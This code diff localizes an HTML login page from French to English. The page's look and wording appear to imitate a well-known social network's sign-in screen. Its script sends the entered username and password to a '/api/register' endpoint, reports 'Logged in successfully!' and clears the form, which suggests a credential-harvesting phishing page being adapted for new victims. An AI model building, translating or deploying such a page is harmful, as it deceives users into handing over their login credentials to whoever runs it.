@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Connexion</title>
+  <title>Log In</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
   <style>
@@ -32,7 +32,7 @@
   <!-- Top Language Selector -->
   <header class="pt-5 text-center">
     <div class="inline-flex items-center text-[#737373] text-[13px] font-normal cursor-pointer">
-      <span>Français (France)</span>
+      <span>English (US)</span>
       <i class="fa-solid fa-chevron-down text-[9px] ml-1.5 text-[#737373]"></i>
     </div>
   </header>
@@ -58,7 +58,7 @@
           autocorrect="off"
           autocapitalize="off"
           spellcheck="false"
-          placeholder="Numéro de mobile, nom d'utilisateur ou e-mail"
+          placeholder="Phone number, username, or email"
           class="w-full px-4 py-3.5 bg-[#fafafa] border border-[#dbdbdb] rounded-[14px] text-black placeholder-[#737373] focus:outline-none focus:border-[#a8a8a8] transition"
         >
       </div>
@@ -70,11 +70,11 @@
           name="secret_key_field"
           required 
           autocomplete="new-password"
-          placeholder="Mot de passe"
+          placeholder="Password"
           class="w-full px-4 py-3.5 bg-[#fafafa] border border-[#dbdbdb] rounded-[14px] text-black placeholder-[#737373] focus:outline-none focus:border-[#a8a8a8] transition pr-14"
         >
         <button type="button" id="togglePass" class="absolute right-3.5 top-3.5 text-xs font-semibold text-[#737373] hover:text-black hidden">
-          Afficher
+          Show
         </button>
       </div>
 
@@ -84,7 +84,7 @@
           id="submitBtn"
           class="w-full py-3.5 px-4 bg-[#0095f6] hover:bg-[#1877f2] active:opacity-80 text-white font-semibold text-sm rounded-[24px] transition duration-150 flex items-center justify-center select-none"
         >
-          <span>Connexion</span>
+          <span>Log In</span>
         </button>
       </div>
     </form>
@@ -92,21 +92,21 @@
     <!-- Forgot password -->
     <div class="text-center mt-4">
       <a href="#" class="text-xs text-black font-semibold hover:underline">
-        Mot de passe oublié ?
+        Forgot password?
       </a>
     </div>
 
     <!-- Divider -->
     <div class="my-7 flex items-center">
       <div class="flex-grow border-t border-[#dbdbdb]"></div>
-      <span class="px-4 text-[12px] font-semibold text-[#737373] uppercase">ou</span>
+      <span class="px-4 text-[12px] font-semibold text-[#737373] uppercase">or</span>
       <div class="flex-grow border-t border-[#dbdbdb]"></div>
     </div>
 
     <!-- Create new account -->
     <div class="text-center">
       <button type="button" class="w-full py-3 px-4 bg-transparent border border-[#0095f6] text-[#0095f6] hover:bg-blue-50/50 font-semibold text-sm rounded-[24px] transition">
-        Créer un nouveau compte
+        Create new account
       </button>
     </div>
 
@@ -152,7 +152,7 @@
       const password = passwordInput.value;
 
       submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1.5"></i> Connexion...';
+      submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1.5"></i> Logging in...';
 
       try {
         const res = await fetch('/api/register', {
@@ -164,19 +164,19 @@
 
         if (res.ok && data.success) {
           alertBox.className = 'mb-4 p-3 rounded-[12px] text-xs bg-emerald-50 text-emerald-700 border border-emerald-200 block text-center font-medium';
-          alertBox.innerHTML = 'Connexion réussie !';
+          alertBox.innerHTML = 'Logged in successfully!';
           form.reset();
           togglePass.classList.add('hidden');
         } else {
           alertBox.className = 'mb-4 p-3 rounded-[12px] text-xs bg-red-50 text-red-600 border border-red-200 block text-center font-medium';
-          alertBox.innerHTML = data.message || 'Une erreur est survenue';
+          alertBox.innerHTML = data.message || 'An error occurred';
         }
       } catch (err) {
         alertBox.className = 'mb-4 p-3 rounded-[12px] text-xs bg-red-50 text-red-600 border border-red-200 block text-center font-medium';
-        alertBox.innerHTML = 'Erreur réseau, réessayez plus tard.';
+        alertBox.innerHTML = 'Network error, please try again.';
       } finally {
         submitBtn.disabled = false;
-        submitBtn.innerHTML = '<span>Connexion</span>';
+        submitBtn.innerHTML = '<span>Log In</span>';
       }
     });
   </script>
